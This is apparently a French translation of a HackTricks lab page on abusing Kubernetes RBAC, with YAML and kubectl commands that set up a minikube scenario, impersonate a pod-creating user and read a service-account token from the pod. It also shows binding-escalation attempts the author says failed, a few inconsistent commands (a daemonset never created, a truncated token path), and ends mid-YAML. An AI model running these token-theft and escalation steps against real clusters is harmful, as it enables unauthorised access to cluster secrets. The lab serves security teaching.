# Laboratoire d'abus de r√¥les Kubernetes

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'exclusivit√©s [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Vous pouvez ex√©cuter ces laboratoires √† l'int√©rieur de **minikube**.

## Cr√©ation de Pod -> Escalade vers ns SAs

Nous allons cr√©er :

* Un **compte de service "test-sa"** avec un privil√®ge de cluster pour **lire les secrets**
  * Un ClusterRole "test-cr" et un ClusterRoleBinding "test-crb" seront cr√©√©s
* Des **permissions** pour lister et **cr√©er** des pods seront donn√©es √† un utilisateur appel√© "**Test**"
  * Un r√¥le "test-r" et un RoleBinding "test-rb" seront cr√©√©s
* Ensuite, nous allons **confirmer** que le SA peut lister les secrets et que l'utilisateur Test peut lister les pods
* Enfin, nous allons **usurper l'utilisateur Test** pour **cr√©er un pod** qui inclut le **SA test-sa** et **voler** le **jeton du compte de service**.
  * C'est la fa√ßon de montrer que l'utilisateur pourrait escalader les privil√®ges de cette mani√®re

{% hint style="info" %}
Pour cr√©er le sc√©nario, un compte administrateur est utilis√©.\
De plus, pour **exfiltrer le jeton sa** dans cet exemple, le **compte administrateur est utilis√©** pour ex√©cuter √† l'int√©rieur du pod cr√©√©. Cependant, **comme expliqu√© ici**, la **d√©claration du pod pourrait contenir l'exfiltration du jeton**, donc le privil√®ge "exec" n'est pas n√©cessaire pour exfiltrer le jeton, la **permission "create" suffit**.
{% endhint %}

```bash
# Cr√©er le compte de service test-sa
# Cr√©er un r√¥le et un RoleBinding pour donner des autorisations de liste et de cr√©ation sur les pods dans l'espace de noms par d√©faut √† l'utilisateur Test
# Cr√©er un clusterrole et un clusterrolebinding pour donner √† SA test-sa l'acc√®s aux secrets partout

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: ServiceAccount
    name: test-sa
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    namespace: default
    name: test-sa
    apiGroup: ""
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# V√©rifier que test-sa peut acc√©der aux secrets de kube-system
kubectl --as system:serviceaccount:default:test-sa -n kube-system get secrets

# V√©rifier que l'utilisateur User peut obtenir des pods dans l'espace de noms par d√©faut
kubectl --as Test -n default get pods

# Cr√©er un pod en tant qu'utilisateur Test avec le SA test-sa (√©tape de privesc)
echo "apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ['/bin/sh']
    args: ['-c', 'sleep 100000']
  serviceAccountName: test-sa
  automountServiceAccountToken: true
  hostNetwork: true"| kubectl --as Test apply -f -

# Se connecter au pod cr√©√© et confirmer que le jeton SA attach√© appartient √† test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes
# Connectez-vous au pod cr√©√© et confirmez que le jeton SA attach√© appartient √† test-sa
kubectl exec -ti -n default daemonset.apps/alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Nettoyez le sc√©nario
kubectl delete daemonset alpine
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```

## Ne fonctionne pas

### Cr√©er/Modifier des Bindings

**Ne fonctionne pas:**

* **Cr√©er un nouveau RoleBinding** juste avec le verbe **create**
* **Cr√©er un nouveau RoleBinding** juste avec le verbe **patch** (vous devez avoir les autorisations de liaison)
  * Vous ne pouvez pas le faire pour vous attribuer le r√¥le ou pour un SA diff√©rent
* **Modifier un nouveau RoleBinding** juste avec le verbe **patch** (vous devez avoir les autorisations de liaison)
  * Vous ne pouvez pas le faire pour vous attribuer le r√¥le ou pour un SA diff√©rent

```bash
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["get", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r2
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb2
subjects:
  - kind: ServiceAccount
    name: test-sa
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Cr√©ez un pod en tant qu'utilisateur Test avec le SA test-sa (√©tape de privesc)
echo "apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-r2
subjects:
  - kind: ServiceAccount
    name: test-sa2
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io"| kubectl --as Test apply -f -

# Connectez-vous au pod cr√©√© et confirmez que le jeton SA attach√© appartient √† test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Nettoyez le sc√©nario
kubectl delete rolebinding test-rb
kubectl delete rolebinding test-rb2
kubectl delete role test-r
kubectl delete role test-r2
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa2
```

### Bindings explicites

Dans la section "Pr√©vention de l'escalade de privil√®ges et amor√ßage" de [https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/](https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/), il est mentionn√© que si un SA peut cr√©er une liaison et a des autorisations explicites de liaison sur le r√¥le/cluster role, il peut cr√©er des liaisons m√™me en utilisant des r√¥les/clusterroles avec des autorisations qu'il n'a pas.\
Cependant, cela n'a pas fonctionn√© pour moi:

```yaml
# Cr√©ez 2 SA, donnez √† l'un d'eux des autorisations pour cr√©er des clusterrolebindings
# et des autorisations de liaison sur le ClusterRole "admin"
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings"]
    verbs: ["get", "create"]
  - apiGroups: ["rbac.authorization.k8s.io/v1"]
    resources: ["clusterroles"]
    verbs: ["bind"]
    resourceNames: ["admin"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    name: test-sa
    namespace: default
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io
' | kubectl apply -f -

# Essayez de lier le ClusterRole "admin" avec le deuxi√®me SA (ne fonctionnera pas)
echo 'apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb2
subjects:
  - kind: ServiceAccount
    name: test-sa2
    namespace: default
roleRef:
  kind: ClusterRole
  name: admin
  apiGroup: rbac.authorization.k8s.io
' | kubectl --as system:serviceaccount:default:test-sa apply -f -

# Nettoyer l'environnement
kubectl delete clusterrolebindings test-crb
kubectl delete clusterrolebindings test-crb2
kubectl delete clusterrole test-cr
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa
```

```yaml
# Comme dans l'exemple pr√©c√©dent, mais dans ce cas, nous essayons d'utiliser des RoleBindings
# au lieu de CLusterRoleBindings

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings